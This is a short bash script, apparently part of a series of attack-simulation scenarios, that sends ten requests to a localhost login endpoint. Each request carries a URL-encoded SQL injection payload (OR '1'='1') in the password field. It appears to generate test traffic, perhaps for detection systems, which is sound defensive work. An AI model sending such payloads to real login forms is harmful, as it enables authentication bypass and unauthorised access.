#!/bin/bash

#!/bin/bash

echo "Début du scénario 5 : Injection SQL (SQLi)".

for i in {1..10}
do
    curl "http://localhost/login?user=admin&pass=aaaOR%20%271%27%3D%271%27bbb"
done

echo "Scénario 5 terminé".